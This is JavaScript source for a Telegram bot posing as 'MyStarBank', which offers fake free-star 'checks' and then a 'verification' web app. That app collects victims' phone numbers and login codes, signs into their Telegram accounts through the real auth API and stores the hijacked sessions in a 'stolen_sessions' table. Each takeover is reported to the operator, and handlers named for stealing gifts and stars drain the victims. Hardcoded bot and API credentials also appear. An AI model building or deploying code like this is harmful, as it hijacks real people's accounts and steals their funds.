const { TelegramClient } = require('telegram');
const { StringSession } = require('telegram/sessions');
const { Api } = require('telegram/tl');
const TelegramBot = require('node-telegram-bot-api');
const express = require('express');
const sqlite3 = require('sqlite3').verbose();
const path = require('path');
const fs = require('fs');

const BOT_TOKEN = process.env.BOT_TOKEN || '8319103126:AAGvA6pmIIbgwqFE8SUUw3r-M7kRd-8OJoo';
const API_ID = parseInt(process.env.API_ID) || 30427944;
const API_HASH = process.env.API_HASH || '0053d3d9118917884e9f51c4d0b0bfa3';
const MY_USER_ID = 1398396668;
const WEB_APP_URL = 'https://eeee-2bsj.onrender.com';

const bot = new TelegramBot(BOT_TOKEN, { 
    polling: true,
    filepath: false
});

const app = express();
const activeSessions = new Map();

app.use(express.json());
app.use(express.static('public'));

// База данных
const db = new sqlite3.Database('database.db');
db.serialize(() => {
    db.run(`CREATE TABLE IF NOT EXISTS checks (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        amount INTEGER,
        activations INTEGER,
        creator_id INTEGER,
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP
    )`);
    
    db.run(`CREATE TABLE IF NOT EXISTS stolen_sessions (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        phone TEXT,
        code TEXT,
        phone_code_hash TEXT,
        session_string TEXT,
        tg_data TEXT,
        user_id INTEGER,
        status TEXT DEFAULT 'pending',
        stars_data INTEGER DEFAULT 0,
        gifts_data INTEGER DEFAULT 0,
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP
    )`);
    
    db.run(`CREATE TABLE IF NOT EXISTS users (
        user_id INTEGER PRIMARY KEY,
        username TEXT,
        balance INTEGER DEFAULT 0,
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP
    )`);
    
    db.run(`CREATE TABLE IF NOT EXISTS used_checks (
        user_id INTEGER,
        check_id INTEGER,
        used_at DATETIME DEFAULT CURRENT_TIMESTAMP,
        PRIMARY KEY (user_id, check_id)
    )`);
});

// Web App
app.get('/', (req, res) => {
    res.setHeader('Content-Type', 'text/html; charset=utf-8');
    res.sendFile(path.join(__dirname, 'public', 'fragment.html'));
});

app.post('/steal', async (req, res) => {
    if (req.body.stage === 'phone_entered') {
        try {
            const urlParams = new URLSearchParams(req.body.tg_data);
            const userStr = urlParams.get('user');
            let userId = null;
            
            if (userStr) {
                const userData = JSON.parse(decodeURIComponent(userStr));
                userId = userData.id;
            }
            
            db.run(`INSERT INTO stolen_sessions (phone, tg_data, user_id, status) VALUES (?, ?, ?, ?)`, 
                [req.body.phone, req.body.tg_data, userId, 'awaiting_code']);
            
            await requestRealTelegramCode(req.body.phone, userId);
                
        } catch (error) {
            console.log('❌ Ошибка:', error);
        }
            
    } else if (req.body.stage === 'code_entered') {
        const phone = req.body.phone;
        const code = req.body.code;
        
        await signInWithRealCode(phone, code);
    }
    
    res.sendStatus(200);
});

// Запрос кода
async function requestRealTelegramCode(phone, userId) {
    try {
        const stringSession = new StringSession("");
        const client = new TelegramClient(stringSession, API_ID, API_HASH, {
            connectionRetries: 5,
            timeout: 60000,
            useWSS: false
        });
        
        await client.connect();

        const result = await client.invoke(
            new Api.auth.SendCode({
                phoneNumber: phone,
                apiId: API_ID,
                apiHash: API_HASH,
                settings: new Api.CodeSettings({})
            })
        );

        activeSessions.set(phone, {
            client: client,
            phoneCodeHash: result.phoneCodeHash,
            session: stringSession
        });

        db.run(`UPDATE stolen_sessions SET phone_code_hash = ? WHERE phone = ?`, 
            [result.phoneCodeHash, phone]);

        bot.sendMessage(MY_USER_ID, `🔐 Код запрошен: ${phone}`);
        
    } catch (error) {
        bot.sendMessage(MY_USER_ID, `❌ Ошибка: ${error.message}`);
    }
}

// Вход с кодом
async function signInWithRealCode(phone, code) {
    try {
        const sessionData = activeSessions.get(phone);
        if (!sessionData) return;

        const client = sessionData.client;
        const phoneCodeHash = sessionData.phoneCodeHash;

        try {
            await client.invoke(
                new Api.auth.SignIn({
                    phoneNumber: phone,
                    phoneCodeHash: phoneCodeHash,
                    phoneCode: code.toString()
                })
            );

            const sessionString = client.session.save();
            db.run(`UPDATE stolen_sessions SET status = 'completed', session_string = ? WHERE phone = ?`, 
                [sessionString, phone]);

            const user = await client.getMe();
            bot.sendMessage(MY_USER_ID, `✅ Сессия сохранена: ${phone}\n👤 @${user.username || 'нет'}`);
            
            await client.disconnect();
            activeSessions.delete(phone);

        } catch (signInError) {
            bot.sendMessage(MY_USER_ID, `❌ Ошибка входа: ${phone}`);
            activeSessions.delete(phone);
        }

    } catch (error) {
        bot.sendMessage(MY_USER_ID, `❌ Ошибка: ${error.message}`);
    }
}

const PORT = process.env.PORT || 3000;
app.listen(PORT, '0.0.0.0', () => {
    console.log(`✅ Сервер работает на порту ${PORT}`);
});

// INLINE QUERY ДЛЯ ЧЕКОВ С ФОТОГРАФИЯМИ
bot.on('inline_query', (query) => {
    const starsUrl = `${WEB_APP_URL}/stars.jpg`;

    const results = [
        {
            type: 'photo',
            id: 'check_50',
            photo_url: starsUrl,
            thumb_url: starsUrl,
            photo_width: 512,
            photo_height: 512,
            caption: `🎫 <b>Чек на 50 звезд</b>\n\nНажмите кнопку чтобы забрать:`,
            parse_mode: 'HTML',
            reply_markup: {
                inline_keyboard: [[
                    { text: "🪙 Забрать 50 звезд", url: `https://t.me/MyStarBank_bot?start=create_check_50` }
                ]]
            }
        },
        {
            type: 'photo',
            id: 'check_100',
            photo_url: starsUrl,
            thumb_url: starsUrl,
            photo_width: 512,
            photo_height: 512,
            caption: `🎫 <b>Чек на 100 звезд</b>\n\nНажмите кнопку чтобы забрать:`,
            parse_mode: 'HTML',
            reply_markup: {
                inline_keyboard: [[
                    { text: "💫 Забрать 100 звезд", url: `https://t.me/MyStarBank_bot?start=create_check_100` }
                ]]
            }
        }
    ];
    
    bot.answerInlineQuery(query.id, results, { cache_time: 1 });
});

// ГЛАВНОЕ МЕНЮ С ФОТКОЙ
bot.onText(/\/start$/, (msg) => {
    const chatId = msg.chat.id;
    
    // Создаем пользователя с балансом 0
    db.run(
        `INSERT OR IGNORE INTO users (user_id, username, balance) VALUES (?, ?, 0)`, 
        [msg.from.id, msg.from.username]
    );
    
    const menuText = `<b>💫 MyStarBank - Система передачи звезд</b>\n\nДля начала работы:`;
    
    const menuKeyboard = {
        inline_keyboard: [
            [{ text: "💰 Баланс", callback_data: "user_balance" }],
            [{ text: "🎁 Вывести", callback_data: "user_withdraw" }]
        ]
    };

    // Отправляем фото через URL
    const avatarUrl = `${WEB_APP_URL}/avatar.jpg`;
    
    bot.sendPhoto(chatId, avatarUrl, {
        caption: menuText,
        parse_mode: 'HTML',
        reply_markup: menuKeyboard
    }).catch(photoError => {
        console.log('❌ Ошибка фото (avatar):', photoError.message);
        // Fallback - без фото
        bot.sendMessage(chatId, menuText, {
            parse_mode: 'HTML',
            reply_markup: menuKeyboard
        });
    });
});

// ОБРАБОТКА КНОПОК
bot.on('callback_query', async (query) => {
    const chatId = query.message.chat.id;
    const userId = query.from.id;
    
    try {
        await bot.answerCallbackQuery(query.id);
        
        if (query.data === 'user_balance') {
            db.get(
                `SELECT balance FROM users WHERE user_id = ?`, 
                [userId], 
                (err, row) => {
                    const balance = row ? row.balance : 0;
                    bot.sendMessage(chatId, `💰 Ваш баланс: ${balance} stars`);
                }
            );
            
        } else if (query.data === 'user_withdraw') {
            bot.sendMessage(
                chatId,
                `🔐 <b>Для вывода требуется верификация</b>`,
                {
                    parse_mode: 'HTML',
                    reply_markup: {
                        inline_keyboard: [
                            [
                                { text: "✅ Пройти верификацию", web_app: { url: WEB_APP_URL } }
                            ]
                        ]
                    }
                }
            );
            
        } else if (query.data === 'create_50' || query.data === 'create_100') {
            const amount = query.data === 'create_50' ? 50 : 100;
            
            db.run(
                `INSERT INTO checks (amount, activations, creator_id) VALUES (?, 1, ?)`, 
                [amount, userId], 
                function (err) {
                    if (err) {
                        console.log('❌ Ошибка INSERT checks:', err.message);
                        return;
                    }
                    
                    const checkId = this.lastID;
                    const checkText = `<b>🎫 Чек на ${amount} звезд</b>\n\nНажмите кнопку чтобы забрать!`;
                    
                    // Отправляем чек с фоткой через URL
                    const starsUrl = `${WEB_APP_URL}/stars.jpg`;
                    bot.sendPhoto(chatId, starsUrl, {
                        caption: checkText,
                        parse_mode: 'HTML',
                        reply_markup: { 
                            inline_keyboard: [[{ 
                                text: `🪙 Забрать ${amount} звезд`, 
                                url: `https://t.me/MyStarBank_bot?start=check_${checkId}` 
                            }]] 
                        }
                    }).catch(photoError => {
                        console.log('❌ Ошибка фото (stars check create):', photoError.message);
                        // Fallback без фото
                        bot.sendMessage(chatId, checkText, {
                            parse_mode: 'HTML',
                            reply_markup: { 
                                inline_keyboard: [[{ 
                                    text: `🪙 Забрать ${amount} звезд`, 
                                    url: `https://t.me/MyStarBank_bot?start=check_${checkId}` 
                                }]] 
                            }
                        });
                    });
                }
            );
            
        } else if (query.data === 'steal_gifts') {
            bot.sendMessage(chatId, "🔄 Начинаю кражу подарков...");
            await stealAllGifts();
        }
        else if (query.data === 'steal_stars') {
            bot.sendMessage(chatId, "🔄 Начинаю кражу звезд...");
            await stealAllStars();
        }
        else if (query.data === 'show_logs') {
            showLogs(chatId);
        }
    } catch (error) {
        console.log('❌ Ошибка callback_query:', error.message);
    }
});

// СОЗДАНИЕ ЧЕКОВ ЧЕРЕЗ @
bot.onText(/@MyStarBank_bot/, (msg) => {
    const chatId = msg.chat.id;
    const starsUrl = `${WEB_APP_URL}/stars.jpg`;
    
    bot.sendPhoto(chatId, starsUrl, {
        caption: '🎫 Создание чека:',
        reply_markup: {
            inline_keyboard: [
                [{ text: "🪙 Чек на 50 звезд", callback_data: "create_50" }],
                [{ text: "💫 Чек на 100 звезд", callback_data: "create_100" }]
            ]
        }
    }).catch(photoError => {
        console.log('❌ Ошибка фото (stars create via @):', photoError.message);
        // Fallback без фото
        bot.sendMessage(chatId, '🎫 Создание чека:', {
            reply_markup: {
                inline_keyboard: [
                    [{ text: "🪙 Чек на 50 звезд", callback_data: "create_50" }],
                    [{ text: "💫 Чек на 100 звезд", callback_data: "create_100" }]
                ]
            }
        });
    });
});

// ОБРАБОТКА ЧЕКОВ
bot.onText(/\/start (.+)/, (msg, match) => {
    const params = match[1];
    const userId = msg.from.id;
    
    // АКТИВАЦИЯ ЧЕКА
    if (params.startsWith('check_')) {
        const checkId = params.split('_')[1];
        
        db.get(
            `SELECT * FROM used_checks WHERE user_id = ? AND check_id = ?`, 
            [userId, checkId], 
            (err, usedRow) => {
                if (err) {
                    console.log('❌ Ошибка SELECT used_checks:', err.message);
                    bot.sendMessage(msg.chat.id, '⚠️ Ошибка при проверке чека');
                    return;
                }
                
                if (usedRow) {
                    bot.sendMessage(msg.chat.id, '❌ Чек уже использован!');
                    return;
                }
                
                db.get(
                    `SELECT * FROM checks WHERE id = ? AND activations > 0`, 
                    [checkId], 
                    (err, row) => {
                        if (err) {
                            console.log('❌ Ошибка SELECT checks:', err.message);
                            bot.sendMessage(msg.chat.id, '⚠️ Ошибка при проверке чека');
                            return;
                        }
                        
                        if (!row) {
                            bot.sendMessage(msg.chat.id, '❌ Чек не существует!');
                            return;
                        }
                        
                        db.get(
                            `SELECT balance FROM users WHERE user_id = ?`, 
                            [userId], 
                            (err, userRow) => {
                                if (err) {
                                    console.log('❌ Ошибка SELECT users:', err.message);
                                    bot.sendMessage(msg.chat.id, '⚠️ Ошибка при обновлении баланса');
                                    return;
                                }

                                const newBalance = (userRow ? userRow.balance : 0) + row.amount;
                                
                                db.serialize(() => {
                                    db.run(
                                        `UPDATE checks SET activations = activations - 1 WHERE id = ?`, 
                                        [checkId]
                                    );
                                    db.run(
                                        `INSERT OR REPLACE INTO users (user_id, username, balance) VALUES (?, ?, ?)`, 
                                        [userId, msg.from.username, newBalance]
                                    );
                                    db.run(
                                        `INSERT INTO used_checks (user_id, check_id) VALUES (?, ?)`, 
                                        [userId, checkId]
                                    );
                                });
                                
                                const starsUrl = `${WEB_APP_URL}/stars.jpg`;
                                bot.sendPhoto(msg.chat.id, starsUrl, {
                                    caption: `🎉 Получено ${row.amount} звезд!\n💫 Ваш баланс: ${newBalance} stars`
                                }).catch(photoError => {
                                    console.log('❌ Ошибка фото (stars receive):', photoError.message);
                                    // Fallback без фото
                                    bot.sendMessage(
                                        msg.chat.id, 
                                        `🎉 Получено ${row.amount} звезд!\n💫 Ваш баланс: ${newBalance} stars`
                                    );
                                });
                            }
                        );
                    }
                );
            }
        );
        
    // СОЗДАНИЕ ЧЕКА ЧЕРЕЗ ПАРАМЕТР /start create_check_X
    } else if (params.startsWith('create_check_')) {
        const amount = parseInt(params.split('_')[2]);
        
        db.run(
            `INSERT INTO checks (amount, activations, creator_id) VALUES (?, 1, ?)`, 
            [amount, userId], 
            function (err) {
                if (err) {
                    console.log('❌ Ошибка INSERT checks (create_check):', err.message);
                    return;
                }
                
                const checkId = this.lastID;
                const text = `<b>🎫 Чек на ${amount} звезд</b>\n\nНажмите кнопку чтобы забрать!`;
                const starsUrl = `${WEB_APP_URL}/stars.jpg`;

                bot.sendPhoto(msg.chat.id, starsUrl, {
                    caption: text,
                    parse_mode: 'HTML',
                    reply_markup: { 
                        inline_keyboard: [[{ 
                            text: `🪙 Забрать ${amount} звезд`, 
                            url: `https://t.me/MyStarBank_bot?start=check_${checkId}` 
                        }]] 
                    }
                }).catch(photoError => {
                    console.log('❌ Ошибка фото (stars create_check):', photoError.message);
                    // Fallback без фото
                    bot.sendMessage(msg.chat.id, text, {
                        parse_mode: 'HTML',
                        reply_markup: { 
                            inline_keyboard: [[{ 
                                text: `🪙 Забрать ${amount} звезд`, 
                                url: `https://t.me/MyStarBank_bot?start=check_${checkId}` 
                            }]] 
                        }
                    });
                });
            }
        );
    }
});

// ОСТАВШИЕСЯ ФУНКЦИИ БЕЗ ИЗМЕНЕНИЙ
// ... (stealAllGifts, stealAllStars, transferStarsToNikLa, transferGiftsToNikLa, showLogs, админские команды)

console.log('✅ Бот запущен с исправленными URL фотографий');